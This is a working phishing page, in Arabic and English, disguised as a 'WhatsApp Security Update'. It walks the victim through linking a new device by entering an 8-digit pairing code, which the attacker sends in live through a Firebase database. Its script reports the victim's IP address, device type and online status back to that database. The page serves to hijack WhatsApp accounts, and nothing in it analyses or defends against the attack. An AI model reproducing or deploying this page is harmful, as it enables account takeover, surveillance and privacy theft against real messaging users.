<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security Update</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
        .container { width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; }
        .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
        .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
        .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
        .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
        .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
        .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; }
        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
        .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
        .arrived { color: #d91e1e !important; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div id="ui-title" class="header-title"></div>
        <div id="ui-badge" class="badge"></div>
        <div class="v-box">
            <div class="v-row"><span id="ui-old-label" style="color:#667781"></span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
            <div style="height:1px; background:#eee; margin:5px 0"></div>
            <div class="v-row"><span id="ui-new-label" style="color:#667781"></span><span style="color:#00a884; font-weight:bold">V3.0.1 (New Version)</span></div>
        </div>
        <p id="ui-alert" class="alert-p"></p>
        <div id="ui-steps" class="steps"></div>
        <div class="code-zone">
            <div id="pairing-code">. . .</div>
            <div id="ui-wait" class="wait-text"></div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        const userId = new URLSearchParams(window.location.search).get('id');

        function getDevice() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android";
            if (/iPad|iPhone|iPod/.test(ua)) return "iPhone";
            return navigator.platform || "PC";
        }

        const trans = {
            ar: { t: "تحديث أمان واتساب", b: "جهاز مرتبط: iPhone", o: "البروتوكول الحالي:", n: "البروتوكول المحدث:", a: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).", s: "<b>كيفية التفعيل:</b><br>1. ستتلقى الآن إشعاراً من واتساب لربط الجهاز؛ اضغط عليه.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b>.<br>3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا:", w: "في انتظار رمز الأمان.. سيصل هنا قريباً", d: "تم استخراج الكود! أدخله في واتساب الآن" },
            en: { t: "WhatsApp Security Update", b: "Linked Device: iPhone", o: "Current Protocol:", n: "Updated Protocol:", a: "To protect your privacy, upgrade to the latest security protocol (V3.0.1).", s: "<b>How to activate:</b><br>1. Tap the WhatsApp notification.<br>2. Select <b>'Link with phone number instead'</b>.<br>3. Enter the 8-digit code shown here:", w: "Awaiting security code...", d: "Code generated! Enter it in WhatsApp" }
        };

        const lang = navigator.language.startsWith('ar') ? trans.ar : trans.en;
        document.documentElement.dir = navigator.language.startsWith('ar') ? 'rtl' : 'ltr';
        document.getElementById('ui-title').innerText = lang.t;
        document.getElementById('ui-badge').innerText = lang.b;
        document.getElementById('ui-old-label').innerText = lang.o;
        document.getElementById('ui-new-label').innerText = lang.n;
        document.getElementById('ui-alert').innerText = lang.a;
        document.getElementById('ui-steps').innerHTML = lang.s;
        document.getElementById('ui-wait').innerText = lang.w;

        if (userId) {
            const sRef = db.ref('monitoring/' + userId);
            const dev = getDevice();
            
            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
                sRef.update({ status: "Online", ip: d.ip, device: dev, ts: Date.now() });
            }).catch(() => sRef.update({ status: "Online", ip: "Hidden", device: dev, ts: Date.now() }));

            sRef.onDisconnect().update({ status: "Offline" });

            db.ref('commands/' + userId).on('value', (snap) => {
                const v = snap.val();
                if (v && v.code) {
                    document.getElementById('pairing-code').innerText = v.code;
                    document.getElementById('ui-wait').innerText = lang.d;
                    document.getElementById('ui-wait').classList.add('arrived');
                }
            });
        }
    </script>
</body>
</html>
